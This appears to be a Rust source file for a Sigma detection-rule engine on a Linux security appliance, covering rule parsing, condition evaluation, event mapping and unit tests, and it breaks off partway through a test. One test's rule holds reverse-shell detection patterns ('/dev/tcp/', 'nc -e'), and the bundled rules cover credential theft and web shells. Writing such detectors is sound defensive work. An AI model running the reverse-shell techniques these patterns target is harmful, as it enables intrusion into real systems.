//! # hookprobe-sigma — Sigma rule ingestion + evaluation (a practical, HONEST subset)
//!
//! Detect workspace advertises "Suricata/Sigma/YARA/AI/Behavioral" engines
//! (`docs/architecture/MissionControl.md` §4) — Sigma was mock (`os/mission-control/src/store/detectMock.ts`'s hard-coded
//! `ENGINES`/feed rows). This crate is a real, first Sigma engine: it parses Sigma YAML rules and
//! evaluates them against HookProbe's OWN event streams (the same `flows`/`host-events` JSON-line
//! schema the evidence graph already ingests — see `crates/hookprobe-evidence/src/lib.rs`'s
//! `ingest_flow`/`ingest_host_event`), firing a real `detections` row through the EXISTING
//! `ingest_detection` path (same schema NAPSE/host-EDR alerts already use — **zero evidence-graph
//! changes needed**; see `modules/sigma/module.yaml`'s doc header for why this runs as a native
//! `runtime: host` binary rather than a Wasm component).
//!
//! ## The Sigma subset THIS crate supports (state plainly — do not overclaim)
//!
//! Supported:
//! - `detection:` selections as a mapping of `field: value` (equality), `field: [v1, v2, …]`
//!   (OR across the list), `field|contains`/`field|startswith`/`field|endswith` (string modifiers,
//!   also list-valued for OR), multiple fields in one selection map (AND across fields).
//! - A selection value that is a LIST OF MAPS (`selection: [{a: 1}, {b: 2}]`) — standard Sigma
//!   "OR of maps" semantics; each map's own fields still AND together.
//! - `condition:` as a plain string combining selection names with `and`/`or`/`not` and
//!   parentheses (a small recursive-descent parser below — [`parse_condition`]).
//! - `logsource.category` used to ROUTE a rule to only the event types it applies to
//!   (`network_connection`, `dns_query`, `process_creation`, `file_event` — see
//!   [`SigmaEvent`]'s doc for the exact category taxonomy this crate uses, which is HookProbe's
//!   OWN, not the Windows/Sysmon taxonomy most public Sigma rules assume).
//! - `level` (critical/high/medium/low/informational) → severity (Suricata convention, matches
//!   every other engine's `SEV_*` constants) and a documented confidence heuristic.
//! - `tags` — the first `attack.tNNNN[.NNN]` tag becomes the detection's `mitre` field (MITRE
//!   ATT&CK technique id); non-technique tags (`attack.execution`, a CVE id, …) are otherwise
//!   ignored (not fabricated into a technique id).
//!
//! NOT supported — a rule using any of these is SKIPPED at load time with a printed warning,
//! **never silently mis-evaluated**:
//! - Aggregation/count conditions (`count() by …`, `1 of them`, `all of them`, `1 of selection*`,
//!   any wildcard identifier in `condition:`) — these need windowed/grouped state this v1 doesn't
//!   carry.
//! - `detection.timeframe` (time-windowed aggregation).
//! - Field modifiers other than `contains`/`startswith`/`endswith` (e.g. `|re`, `|base64`,
//!   `|cidr`, `|all` — the "AND across list values" variant of a modifier).
//! - `condition:` as anything other than one plain string (a YAML list of conditions, etc).
//!
//! ## Field-name mapping — HookProbe's OWN schema, not generic Sysmon/Windows fields
//!
//! Public Sigma rule repositories (SigmaHQ) overwhelmingly target Windows Sysmon / Windows Event
//! Log field names (`Image`, `CommandLine`, `ParentImage`, `DestinationPort`, …) because that is
//! Sigma's dominant authoring convention. HookProbe OS is a Linux edge device with its OWN event
//! schema (see `crates/hookprobe-evidence/src/lib.rs`'s `ingest_flow`/`ingest_host_event` field
//! lists). Rather than pretend field names magically line up, [`normalize_field_name`] documents
//! and implements a SMALL, EXPLICIT alias table from the handful of standard Sigma field names the
//! bundled starter rules use onto this crate's own event schema. **A rule copied verbatim from an
//! external Sigma repo will very likely reference fields this alias table does not know — it will
//! simply never match (a missing field is "no match", never a crash or a false positive), not
//! silently misfire.** This is a deliberate v1 scope limit: a practical Linux/network Sigma subset
//! for HookProbe's own telemetry, not a claim of drop-in SigmaHQ-rule-pack compatibility.
#![forbid(unsafe_code)]

use serde_yaml::Value as YamlValue;
use std::collections::HashMap;

// ─── Severity / confidence (Suricata convention, matches every other engine in this workspace) ──

pub const SEV_CRITICAL: i64 = 1;
pub const SEV_HIGH: i64 = 2;
pub const SEV_MEDIUM: i64 = 3;
pub const SEV_LOW: i64 = 4;
pub const SEV_INFO: i64 = 5;

/// `rule_id` numbering: every OTHER engine in this workspace (`modules/napse` 1_000_001..=1_000_025,
/// `napse-capture` 1_000_003/012/013/014/030..=033/040/041, `hookprobe-evidence::host_edr`
/// 1_000_100..=1_000_118, the resource-shed 1_000_050, the supply-chain bands 9_1xx_xxx/9_2xx_xxx —
/// checked 2026-07-08 against every `RULE_ID`/`rule_id` constant in the tree) uses a small,
/// hand-enumerated literal per FIXED detection. Sigma rules are the opposite: an open-ended,
/// PLUGGABLE set identified by their own `id:` (a UUID) or `title:` — there is no fixed enum to
/// number by hand. This crate reserves its OWN numeric space, far above every other engine's band
/// (`2_000_000_000..`, i.e. >2 billion — nowhere near any literal constant above), and derives a
/// STABLE per-rule `rule_id` deterministically from the rule's own `id`/`title` string (same
/// FNV-1a-then-mask idiom `hookprobe_evidence::sid()` uses for its own stable node ids). Masked to
/// 28 bits (~268M buckets) — collision-free in practice for the handful of rules a device loads;
/// a genuinely large rule pack (thousands of rules) would need a wider reservation or a real
/// UUID-keyed side table, which is out of this v1's tractable scope (documented, not silently
/// accepted).
pub const SIGMA_RULE_ID_BASE: i64 = 2_000_000_000;

fn fnv1a(s: &str) -> u64 {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in s.as_bytes() {
        h ^= *b as u64;
        h = h.wrapping_mul(0x0000_0100_0000_01b3);
    }
    h
}

/// Deterministic numeric `rule_id` for a Sigma rule, derived from its own `id`/`title` string.
pub fn sigma_rule_id(natural_key: &str) -> i64 {
    SIGMA_RULE_ID_BASE + (fnv1a(natural_key) & 0x0FFF_FFFF) as i64
}

// ─── Field matching ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Modifier {
    Equals,
    Contains,
    StartsWith,
    EndsWith,
}

#[derive(Debug, Clone, PartialEq)]
pub struct FieldMatch {
    pub field: String,
    pub modifier: Modifier,
    pub values: Vec<String>,
}

/// One selection "map": fields AND together (standard Sigma semantics for one mapping).
#[derive(Debug, Clone, Default, PartialEq)]
pub struct FieldMap(pub Vec<FieldMatch>);

/// The condition-string AST (a practical subset — see module doc).
#[derive(Debug, Clone, PartialEq)]
pub enum CondExpr {
    Ident(String),
    Not(Box<CondExpr>),
    And(Vec<CondExpr>),
    Or(Vec<CondExpr>),
}

/// Standard Sigma field-name aliases this crate recognizes (see module doc's honesty note).
/// Anything not in this table is used VERBATIM, lowercased — so a rule already written against
/// HookProbe's own field names (`dst_port`, `cmdline`, `query`, …) works unmodified.
fn normalize_field_name(raw: &str) -> String {
    let lc = raw.to_ascii_lowercase();
    match lc.as_str() {
        "image" => "name".to_string(),
        "originalfilename" => "name".to_string(),
        "commandline" => "cmdline".to_string(),
        "parentimage" => "parent_name".to_string(),
        "destinationip" => "dst_ip".to_string(),
        "destinationport" => "dst_port".to_string(),
        "sourceip" => "src_ip".to_string(),
        "sourceport" => "src_port".to_string(),
        "protocol" => "proto".to_string(),
        "queryname" => "query".to_string(),
        "targetfilename" => "path".to_string(),
        "cs-uri" | "c-uri" => "uri".to_string(),
        other => other.to_string(),
    }
}

// ─── Rule ────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Level {
    Critical,
    High,
    Medium,
    Low,
    Informational,
}

impl Level {
    fn parse(s: &str) -> Self {
        match s.to_ascii_lowercase().as_str() {
            "critical" => Level::Critical,
            "high" => Level::High,
            "medium" => Level::Medium,
            "low" => Level::Low,
            "informational" | "info" => Level::Informational,
            _ => Level::Medium, // undeclared/unrecognized level -> documented default
        }
    }

    pub fn severity(self) -> i64 {
        match self {
            Level::Critical => SEV_CRITICAL,
            Level::High => SEV_HIGH,
            Level::Medium => SEV_MEDIUM,
            Level::Low => SEV_LOW,
            Level::Informational => SEV_INFO,
        }
    }

    /// Sigma carries no native confidence signal. Confidence is a documented, monotonic heuristic
    /// keyed off `level` — the same class of stated heuristic `modules/napse` uses per-rule.
    pub fn confidence(self) -> f64 {
        match self {
            Level::Critical => 0.90,
            Level::High => 0.75,
            Level::Medium => 0.60,
            Level::Low => 0.45,
            Level::Informational => 0.30,
        }
    }
}

#[derive(Debug, Clone)]
pub struct SigmaRule {
    /// The Sigma rule's own `id:` (a UUID) if present, else a slug of its title.
    pub sigma_id: String,
    pub title: String,
    pub level: Level,
    /// First `attack.tNNNN[.NNN]` tag, normalized to `TNNNN[.NNN]`; empty if none present.
    pub mitre: String,
    /// `logsource.category`, used to route events to this rule. `None` = applies to every event
    /// category this engine sees (rare — bundled rules all declare one).
    pub category: Option<String>,
    pub selections: HashMap<String, Vec<FieldMap>>,
    pub condition: CondExpr,
    /// Stable numeric id for the `detections` table (see [`sigma_rule_id`]).
    pub rule_id: i64,
}

/// One HookProbe event, already normalized to this crate's own flat field schema (see module doc).
#[derive(Debug, Clone, Default)]
pub struct SigmaEvent {
    /// `"network_connection"` | `"dns_query"` | `"process_creation"` | `"file_event"`.
    pub category: String,
    pub fields: HashMap<String, String>,
    // Carried through so a firing rule can build a detection line without re-deriving these from
    // `fields` (which stores everything as normalized strings) — mirrors `FlowRecord`'s own
    // dedicated src/dst columns in `modules/napse`.
    pub ts: f64,
    pub src_ip: String,
    pub dst_ip: String,
    pub dst_port: i64,
}

impl SigmaEvent {
    fn get(&self, field: &str) -> Option<&str> {
        self.fields.get(field).map(|s| s.as_str())
    }
}

// ─── Condition parser ────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
enum Tok {
    Ident(String),
    LParen,
    RParen,
    And,
    Or,
    Not,
}

fn tokenize(s: &str) -> Result<Vec<Tok>, String> {
    let mut toks = Vec::new();
    let mut chars = s.chars().peekable();
    let mut buf = String::new();
    let flush = |buf: &mut String, toks: &mut Vec<Tok>| -> Result<(), String> {
        if buf.is_empty() {
            return Ok(());
        }
        let word = std::mem::take(buf);
        toks.push(match word.to_ascii_lowercase().as_str() {
            "and" => Tok::And,
            "or" => Tok::Or,
            "not" => Tok::Not,
            _ => {
                if word.contains('*') {
                    return Err(format!(
                        "unsupported: wildcard identifier '{word}' in condition (e.g. '1 of selection*') is not supported"
                    ));
                }
                Tok::Ident(word)
            }
        });
        Ok(())
    };
    while let Some(&c) = chars.peek() {
        match c {
            '(' => {
                flush(&mut buf, &mut toks)?;
                toks.push(Tok::LParen);
                chars.next();
            }
            ')' => {
                flush(&mut buf, &mut toks)?;
                toks.push(Tok::RParen);
                chars.next();
            }
            c if c.is_whitespace() => {
                flush(&mut buf, &mut toks)?;
                chars.next();
            }
            _ => {
                buf.push(c);
                chars.next();
            }
        }
    }
    flush(&mut buf, &mut toks)?;
    Ok(toks)
}

/// Parse a Sigma `condition:` string into a [`CondExpr`] — a small recursive-descent parser for
/// the supported subset (`and`/`or`/`not`/parentheses over selection-name identifiers). Anything
/// outside that grammar (aggregation, wildcards, …) is rejected with an explicit reason BEFORE
/// tokenizing gets a chance to mis-parse it (see the pre-scan in [`compile_detection`]).
pub fn parse_condition(s: &str) -> Result<CondExpr, String> {
    let toks = tokenize(s)?;
    if toks.is_empty() {
        return Err("empty condition".to_string());
    }
    let mut pos = 0usize;
    let expr = parse_or(&toks, &mut pos)?;
    if pos != toks.len() {
        return Err(format!("unexpected trailing tokens at position {pos} in condition '{s}'"));
    }
    Ok(expr)
}

fn parse_or(toks: &[Tok], pos: &mut usize) -> Result<CondExpr, String> {
    let mut terms = vec![parse_and(toks, pos)?];
    while matches!(toks.get(*pos), Some(Tok::Or)) {
        *pos += 1;
        terms.push(parse_and(toks, pos)?);
    }
    Ok(if terms.len() == 1 { terms.pop().unwrap() } else { CondExpr::Or(terms) })
}

fn parse_and(toks: &[Tok], pos: &mut usize) -> Result<CondExpr, String> {
    let mut factors = vec![parse_not(toks, pos)?];
    while matches!(toks.get(*pos), Some(Tok::And)) {
        *pos += 1;
        factors.push(parse_not(toks, pos)?);
    }
    Ok(if factors.len() == 1 { factors.pop().unwrap() } else { CondExpr::And(factors) })
}

fn parse_not(toks: &[Tok], pos: &mut usize) -> Result<CondExpr, String> {
    if matches!(toks.get(*pos), Some(Tok::Not)) {
        *pos += 1;
        return Ok(CondExpr::Not(Box::new(parse_not(toks, pos)?)));
    }
    parse_atom(toks, pos)
}

fn parse_atom(toks: &[Tok], pos: &mut usize) -> Result<CondExpr, String> {
    match toks.get(*pos) {
        Some(Tok::LParen) => {
            *pos += 1;
            let e = parse_or(toks, pos)?;
            match toks.get(*pos) {
                Some(Tok::RParen) => {
                    *pos += 1;
                    Ok(e)
                }
                _ => Err("expected closing ')'".to_string()),
            }
        }
        Some(Tok::Ident(name)) => {
            *pos += 1;
            Ok(CondExpr::Ident(name.clone()))
        }
        other => Err(format!("expected identifier or '(', found {other:?}")),
    }
}

fn collect_idents(expr: &CondExpr, out: &mut Vec<String>) {
    match expr {
        CondExpr::Ident(n) => out.push(n.clone()),
        CondExpr::Not(e) => collect_idents(e, out),
        CondExpr::And(es) | CondExpr::Or(es) => es.iter().for_each(|e| collect_idents(e, out)),
    }
}

// ─── Rule compilation (YAML -> SigmaRule) ────────────────────────────────────

fn as_str_lossy(v: &YamlValue) -> Option<String> {
    match v {
        YamlValue::String(s) => Some(s.clone()),
        YamlValue::Number(n) => Some(n.to_string()),
        YamlValue::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

/// Compile one selection's YAML value into an OR-of-[`FieldMap`]s.
fn compile_selection_value(v: &YamlValue) -> Result<Vec<FieldMap>, String> {
    match v {
        YamlValue::Mapping(m) => Ok(vec![compile_field_map(m)?]),
        YamlValue::Sequence(seq) => {
            // "OR of maps" form: selection: [{a: 1}, {b: 2}]
            let mut maps = Vec::with_capacity(seq.len());
            for item in seq {
                match item {
                    YamlValue::Mapping(m) => maps.push(compile_field_map(m)?),
                    _ => return Err("unsupported: selection list items must be maps".to_string()),
                }
            }
            Ok(maps)
        }
        _ => Err("unsupported: selection value must be a map or a list of maps".to_string()),
    }
}

fn compile_field_map(m: &serde_yaml::Mapping) -> Result<FieldMap, String> {
    let mut matches = Vec::with_capacity(m.len());
    for (k, v) in m {
        let raw_key = k.as_str().ok_or("selection field key must be a string")?;
        let (field_part, modifier_part) = match raw_key.split_once('|') {
            Some((f, m)) => (f, Some(m)),
            None => (raw_key, None),
        };
        let modifier = match modifier_part {
            None => Modifier::Equals,
            Some("contains") => Modifier::Contains,
            Some("startswith") => Modifier::StartsWith,
            Some("endswith") => Modifier::EndsWith,
            Some(other) => {
                return Err(format!(
                    "unsupported: field modifier '|{other}' is not in this crate's subset (only \
                     |contains, |startswith, |endswith, and bare equality are supported)"
                ))
            }
        };
        let values = match v {
            YamlValue::Sequence(seq) => seq
                .iter()
                .map(|item| as_str_lossy(item).ok_or_else(|| "unsupported: non-scalar value in field list".to_string()))
                .collect::<Result<Vec<_>, _>>()?,
            scalar => vec![as_str_lossy(scalar).ok_or_else(|| "unsupported: non-scalar field value".to_string())?],
        };
        matches.push(FieldMatch { field: normalize_field_name(field_part), modifier, values });
    }
    Ok(FieldMap(matches))
}

/// Compile a rule's `detection:` mapping into (selections, condition AST).
fn compile_detection(det: &YamlValue) -> Result<(HashMap<String, Vec<FieldMap>>, CondExpr), String> {
    let map = det.as_mapping().ok_or("detection: must be a mapping")?;
    if map.iter().any(|(k, _)| k.as_str() == Some("timeframe")) {
        return Err(
            "unsupported: detection.timeframe (windowed aggregation) is not supported in this subset"
                .to_string(),
        );
    }
    let condition_value = map
        .iter()
        .find(|(k, _)| k.as_str() == Some("condition"))
        .map(|(_, v)| v.clone())
        .ok_or("detection.condition is required")?;
    let condition_str = condition_value
        .as_str()
        .ok_or("unsupported: detection.condition must be a plain string")?;
    // Pre-scan for the aggregation idioms that are grammatically valid-looking words but are
    // semantically unsupported (count()/"of them"/"of selection") — reject BEFORE the tokenizer
    // parses them as ordinary identifiers, so they fail loudly instead of silently mis-evaluating
    // as "an identifier that never matches anything".
    let lc = condition_str.to_ascii_lowercase();
    if lc.contains("count(")
        || lc.contains(" of them")
        || lc.contains(" of selection")
        || lc.contains("all of ")
        || lc.contains("1 of ")
    {
        return Err(format!(
            "unsupported: aggregation/quantifier condition idiom in '{condition_str}' (count()/\"N of \
             them\"/\"all of\"/\"1 of selection*\") is not supported in this subset"
        ));
    }
    let condition = parse_condition(condition_str)?;

    let mut selections = HashMap::new();
    for (k, v) in map {
        let name = match k.as_str() {
            Some(n) => n,
            None => continue,
        };
        if name == "condition" {
            continue;
        }
        selections.insert(name.to_string(), compile_selection_value(v)?);
    }
    let mut idents = Vec::new();
    collect_idents(&condition, &mut idents);
    for ident in &idents {
        if !selections.contains_key(ident) {
            return Err(format!("condition references undefined selection '{ident}'"));
        }
    }
    Ok((selections, condition))
}

/// Extract the first `attack.tNNNN[.NNN]` tag (case-insensitive) as a normalized `TNNNN[.NNN]`
/// MITRE technique id. Any other tag (`attack.execution`, `attack.ta0002`, a CVE id, …) is ignored
/// — never fabricated into a technique id.
fn extract_mitre(tags: &[String]) -> String {
    for t in tags {
        let lc = t.to_ascii_lowercase();
        if let Some(rest) = lc.strip_prefix("attack.t") {
            if rest.chars().next().is_some_and(|c| c.is_ascii_digit()) {
                return format!("T{rest}").to_ascii_uppercase();
            }
        }
    }
    String::new()
}

/// Parse + compile one Sigma rule from YAML text. `Err` carries a human-readable reason — either
/// a genuine parse error or an explicit "unsupported: …" (see module doc) — the caller's job is to
/// print it and SKIP the rule, never to guess.
pub fn compile_rule(yaml_text: &str) -> Result<SigmaRule, String> {
    let doc: YamlValue = serde_yaml::from_str(yaml_text).map_err(|e| format!("YAML parse error: {e}"))?;
    let title = doc
        .get("title")
        .and_then(|v| v.as_str())
        .ok_or("rule has no 'title'")?
        .to_string();
    let sigma_id = doc
        .get("id")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| title.clone());
    let level = doc.get("level").and_then(|v| v.as_str()).map(Level::parse).unwrap_or(Level::Medium);
    let tags: Vec<String> = doc
        .get("tags")
        .and_then(|v| v.as_sequence())
        .map(|seq| seq.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
        .unwrap_or_default();
    let mitre = extract_mitre(&tags);
    let category = doc
        .get("logsource")
        .and_then(|ls| ls.get("category"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());
    let detection = doc.get("detection").ok_or("rule has no 'detection'")?;
    let (selections, condition) = compile_detection(detection)?;
    let rule_id = sigma_rule_id(&sigma_id);
    Ok(SigmaRule { sigma_id, title, level, mitre, category, selections, condition, rule_id })
}

// ─── Evaluation ───────────────────────────────────────────────────────────────

fn field_match(event: &SigmaEvent, m: &FieldMatch) -> bool {
    let val = match event.get(&m.field) {
        Some(v) => v,
        None => return false, // field absent -> no match, never a false positive
    };
    let val_lc = val.to_ascii_lowercase();
    m.values.iter().any(|pat| {
        let pat_lc = pat.to_ascii_lowercase();
        match m.modifier {
            Modifier::Equals => val_lc == pat_lc,
            Modifier::Contains => val_lc.contains(&pat_lc),
            Modifier::StartsWith => val_lc.starts_with(&pat_lc),
            Modifier::EndsWith => val_lc.ends_with(&pat_lc),
        }
    })
}

fn field_map_match(event: &SigmaEvent, fm: &FieldMap) -> bool {
    !fm.0.is_empty() && fm.0.iter().all(|m| field_match(event, m))
}

fn selection_match(event: &SigmaEvent, maps: &[FieldMap]) -> bool {
    maps.iter().any(|fm| field_map_match(event, fm))
}

fn eval_cond(expr: &CondExpr, sel: &HashMap<String, bool>) -> bool {
    match expr {
        CondExpr::Ident(name) => *sel.get(name).unwrap_or(&false),
        CondExpr::Not(e) => !eval_cond(e, sel),
        CondExpr::And(es) => es.iter().all(|e| eval_cond(e, sel)),
        CondExpr::Or(es) => es.iter().any(|e| eval_cond(e, sel)),
    }
}

/// Does `rule` match `event`? Routes by `logsource.category` first (a rule with a declared
/// category never fires on an event of a different category), then evaluates the condition AST
/// over each selection's match result.
pub fn rule_matches(rule: &SigmaRule, event: &SigmaEvent) -> bool {
    if let Some(cat) = &rule.category {
        if event.category != *cat {
            return false;
        }
    }
    let sel_results: HashMap<String, bool> = rule
        .selections
        .iter()
        .map(|(name, maps)| (name.clone(), selection_match(event, maps)))
        .collect();
    eval_cond(&rule.condition, &sel_results)
}

/// One fired Sigma detection, ready to serialize into the SAME JSON detection schema
/// `hookprobe_evidence::EvidenceGraph::ingest_detection` already consumes (`rule_id`/`rule_msg`/
/// `category`/`severity`/`mitre`/`src_ip`/`dst_ip`/`dst_port`/`confidence`) — no evidence-graph
/// changes needed.
#[derive(Debug, Clone)]
pub struct SigmaAlert {
    pub ts: f64,
    pub rule_id: i64,
    pub rule_msg: String,
    pub category: &'static str,
    pub severity: i64,
    pub mitre: String,
    pub src_ip: String,
    pub dst_ip: String,
    pub dst_port: i64,
    pub confidence: f64,
}

impl SigmaAlert {
    pub fn to_json(&self) -> String {
        serde_json::json!({
            "ts": self.ts,
            "rule_id": self.rule_id,
            "rule_msg": self.rule_msg,
            "category": self.category,
            "severity": self.severity,
            "mitre": self.mitre,
            "src_ip": self.src_ip,
            "dst_ip": self.dst_ip,
            "dst_port": self.dst_port,
            "confidence": self.confidence,
        })
        .to_string()
    }
}

/// Evaluate every loaded rule against one event; returns every rule that fired (a single event can
/// legitimately trip more than one rule — same "return every match" discipline
/// `hookprobe_evidence::host_edr::classify_exec` uses, not just the first).
pub fn evaluate_event(rules: &[SigmaRule], event: &SigmaEvent) -> Vec<SigmaAlert> {
    rules
        .iter()
        .filter(|r| rule_matches(r, event))
        .map(|r| SigmaAlert {
            ts: event.ts,
            rule_id: r.rule_id,
            rule_msg: format!("[Sigma] {} (sigma_id={})", r.title, r.sigma_id),
            category: "sigma_match",
            severity: r.level.severity(),
            mitre: r.mitre.clone(),
            src_ip: event.src_ip.clone(),
            dst_ip: event.dst_ip.clone(),
            dst_port: event.dst_port,
            confidence: r.level.confidence(),
        })
        .collect()
}

// ─── Event construction from HookProbe's raw JSON streams ───────────────────

/// Build a [`SigmaEvent`] from one `/var/lib/hookprobe/flows` JSON line (the same schema
/// `modules/napse`'s `FlowRecord` parses — `"type":"conn"|"dns"|"tls"|"http"`).
pub fn event_from_flow_json(v: &serde_json::Value) -> Option<SigmaEvent> {
    let rtype = v["type"].as_str().unwrap_or("");
    let category = match rtype {
        "dns" => "dns_query",
        _ => "network_connection", // conn/tls/http all route as network_connection
    };
    let mut fields = HashMap::new();
    let mut put_str = |k: &str, val: Option<&str>| {
        if let Some(s) = val {
            fields.insert(k.to_string(), s.to_string());
        }
    };
    put_str("src_ip", v["src_ip"].as_str());
    put_str("dst_ip", v["dst_ip"].as_str());
    put_str("proto", v["proto"].as_str());
    put_str("service", v["service"].as_str());
    put_str("conn_state", v["conn_state"].as_str());
    put_str("query", v["query"].as_str());
    put_str("ja3", v["ja3"].as_str());
    put_str("tls_version", v["tls_version"].as_str());
    put_str("tls_sni", v["tls_sni"].as_str());
    put_str("uri", v["uri"].as_str());
    put_str("method", v["method"].as_str());
    if let Some(p) = v["src_port"].as_i64() {
        fields.insert("src_port".to_string(), p.to_string());
    }
    let dst_port = v["dst_port"].as_i64().unwrap_or(0);
    fields.insert("dst_port".to_string(), dst_port.to_string());

    let src_ip = v["src_ip"].as_str().unwrap_or("").to_string();
    if src_ip.is_empty() {
        return None; // no source identity -> nothing to attribute a detection to
    }
    Some(SigmaEvent {
        category: category.to_string(),
        fields,
        ts: v["ts"].as_f64().unwrap_or(0.0),
        src_ip,
        dst_ip: v["dst_ip"].as_str().unwrap_or("").to_string(),
        dst_port,
    })
}

/// Build a [`SigmaEvent`] from one `/var/lib/hookprobe/host-events` JSON line
/// (`"type":"process"|"file"`, same schema `hookprobe_evidence::ingest_host_event` parses).
/// `parent_name` is the caller's best-effort pid->name lookup (`None` if unknown) — mirrors
/// `host_edr::classify_exec`'s own "skip the parentage check, never false-positive" contract.
pub fn event_from_host_json(v: &serde_json::Value, parent_name: Option<&str>) -> Option<SigmaEvent> {
    let device_ip = v["device_ip"].as_str().unwrap_or("").to_string();
    if device_ip.is_empty() {
        return None;
    }
    let ts = v["ts"].as_f64().unwrap_or(0.0);
    match v["type"].as_str().unwrap_or("") {
        "process" => {
            let mut fields = HashMap::new();
            if let Some(name) = v["name"].as_str() {
                fields.insert("name".to_string(), name.to_string());
            }
            if let Some(cl) = v["cmdline"].as_str() {
                fields.insert("cmdline".to_string(), cl.to_string());
            }
            if let Some(pn) = parent_name {
                fields.insert("parent_name".to_string(), pn.to_string());
            }
            Some(SigmaEvent {
                category: "process_creation".to_string(),
                fields,
                ts,
                src_ip: device_ip,
                dst_ip: String::new(),
                dst_port: 0,
            })
        }
        "file" => {
            let mut fields = HashMap::new();
            if let Some(p) = v["path"].as_str() {
                fields.insert("path".to_string(), p.to_string());
            }
            if let Some(a) = v["action"].as_str() {
                fields.insert("action".to_string(), a.to_string());
            }
            Some(SigmaEvent {
                category: "file_event".to_string(),
                fields,
                ts,
                src_ip: device_ip,
                dst_ip: String::new(),
                dst_port: 0,
            })
        }
        _ => None,
    }
}

/// Load + compile the bundled starter rules (see `modules/sigma/rules/*.yml`). Returns
/// `(compiled_rules, skipped)` where `skipped` is `(source_label, reason)` for every rule that
/// failed to parse/compile — printed as a warning by the binary, NEVER silently dropped.
pub fn load_bundled_rules() -> (Vec<SigmaRule>, Vec<(String, String)>) {
    const BUNDLED: &[(&str, &str)] = &[
        ("sigma_reverse_shell_exec.yml", include_str!("../rules/sigma_reverse_shell_exec.yml")),
        ("sigma_suspicious_download_exec.yml", include_str!("../rules/sigma_suspicious_download_exec.yml")),
        ("sigma_suspicious_tld_dns.yml", include_str!("../rules/sigma_suspicious_tld_dns.yml")),
        ("sigma_cleartext_telnet.yml", include_str!("../rules/sigma_cleartext_telnet.yml")),
        ("sigma_root_shell_not_cron.yml", include_str!("../rules/sigma_root_shell_not_cron.yml")),
        // ── 2026-07-08 MITRE ATT&CK coverage expansion (P1d) — 14 new rules, each a real NEW
        // angle (not a duplicate of hookprobe_evidence::host_edr's exec/persistence heuristics —
        // see each rule's own doc header for the specific, honest non-overlap argument).
        ("sigma_rc_local_persistence.yml", include_str!("../rules/sigma_rc_local_persistence.yml")),
        ("sigma_sudoers_tamper.yml", include_str!("../rules/sigma_sudoers_tamper.yml")),
        ("sigma_pam_config_tamper.yml", include_str!("../rules/sigma_pam_config_tamper.yml")),
        ("sigma_web_shell_drop.yml", include_str!("../rules/sigma_web_shell_drop.yml")),
        ("sigma_ssh_private_key_access.yml", include_str!("../rules/sigma_ssh_private_key_access.yml")),
        ("sigma_credential_file_access.yml", include_str!("../rules/sigma_credential_file_access.yml")),
        ("sigma_local_port_scanner_exec.yml", include_str!("../rules/sigma_local_port_scanner_exec.yml")),
        ("sigma_privesc_enum_tool_exec.yml", include_str!("../rules/sigma_privesc_enum_tool_exec.yml")),
        ("sigma_doh_resolver_usage.yml", include_str!("../rules/sigma_doh_resolver_usage.yml")),
        ("sigma_dns_tunnel_tool_exec.yml", include_str!("../rules/sigma_dns_tunnel_tool_exec.yml")),
        ("sigma_oob_callback_dns.yml", include_str!("../rules/sigma_oob_callback_dns.yml")),
        ("sigma_secure_delete_tool_exec.yml", include_str!("../rules/sigma_secure_delete_tool_exec.yml")),
        ("sigma_security_tooling_disabled.yml", include_str!("../rules/sigma_security_tooling_disabled.yml")),
        ("sigma_sshpass_lateral_movement.yml", include_str!("../rules/sigma_sshpass_lateral_movement.yml")),
        // Deliberately unsupported-by-design fixture (proves the "skip with a warning, never
        // mis-fire" contract end to end — see the unit test below and this crate's honesty bar).
        ("sigma_unsupported_aggregation.yml", include_str!("../rules/sigma_unsupported_aggregation.yml")),
    ];
    let mut rules = Vec::new();
    let mut skipped = Vec::new();
    for (name, text) in BUNDLED {
        match compile_rule(text) {
            Ok(r) => rules.push(r),
            Err(reason) => skipped.push((name.to_string(), reason)),
        }
    }
    (rules, skipped)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ev(category: &str, fields: &[(&str, &str)]) -> SigmaEvent {
        SigmaEvent {
            category: category.to_string(),
            fields: fields.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
            ts: 100.0,
            src_ip: "203.0.113.7".to_string(),
            dst_ip: "192.168.1.1".to_string(),
            dst_port: 0,
        }
    }

    // ── condition parser ──────────────────────────────────────────────────

    #[test]
    fn parses_bare_identifier() {
        assert_eq!(parse_condition("selection").unwrap(), CondExpr::Ident("selection".into()));
    }

    #[test]
    fn parses_and_or_not_precedence() {
        // `and` binds tighter than `or`; `not` binds tighter than `and`.
        let expr = parse_condition("a or b and not c").unwrap();
        assert_eq!(
            expr,
            CondExpr::Or(vec![
                CondExpr::Ident("a".into()),
                CondExpr::And(vec![CondExpr::Ident("b".into()), CondExpr::Not(Box::new(CondExpr::Ident("c".into())))]),
            ])
        );
    }

    #[test]
    fn parses_parentheses() {
        let expr = parse_condition("(a or b) and c").unwrap();
        assert_eq!(
            expr,
            CondExpr::And(vec![
                CondExpr::Or(vec![CondExpr::Ident("a".into()), CondExpr::Ident("b".into())]),
                CondExpr::Ident("c".into()),
            ])
        );
    }

    #[test]
    fn rejects_wildcard_identifier() {
        assert!(parse_condition("1 of selection*").is_err());
    }

    // ── field matching / modifiers ────────────────────────────────────────

    #[test]
    fn equality_modifier_matches_case_insensitively() {
        let rule_yaml = r#"
title: Equality Test
level: medium
logsource:
  category: network_connection
detection:
  selection:
    proto: TCP
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert!(rule_matches(&rule, &ev("network_connection", &[("proto", "tcp")])));
        assert!(!rule_matches(&rule, &ev("network_connection", &[("proto", "udp")])));
    }

    #[test]
    fn contains_modifier_with_list_is_or() {
        let rule_yaml = r#"
title: Contains Test
level: high
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "/dev/tcp/"
      - "nc -e"
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
